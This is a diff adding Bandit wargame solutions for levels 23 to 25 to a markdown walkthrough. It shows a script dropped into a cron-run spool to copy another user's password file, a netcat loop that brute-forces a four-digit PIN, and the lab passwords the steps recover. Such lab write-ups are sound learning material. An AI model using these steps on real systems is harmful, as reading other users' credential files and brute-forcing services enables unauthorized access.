@@ -964,3 +964,78 @@ bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 ```
+
+
+
+## Bandit Level 23 → Level 24
+### Level Goal
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+
+- cronjob 
+
+```bash
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+- Now create directory in `tmp` and give permissions to write a file to it.
+- write a shell script to read the `password` from `/etc/bandit_pass/bandit24` and write to the directory created in `tmp` and place it in `/car/spool/bandit24`
+
+- script
+
+```bash
+bandit23@bandit:/tmp/bandit_user_24$ cat /var/spool/bandit24/user.sh
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 > /tmp/bandit_user_24/pass24file
+```
+- Now wait for the script to execute , and once it is done `pass24file` file shoule be created in dircetory in `tmp`.
+
+```bash
+bandit23@bandit:/tmp/bandit_user_24$ ls
+pass24file  user.sh
+bandit23@bandit:/tmp/bandit_user_24$ cat pass24file 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+
+
+## Bandit Level 24 → Level 25
+### Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing
+
+```bash
+$ for i in {0000..9999} ;do echo $PASS$i; done | nc localhost 30002
+
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+...
+...
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
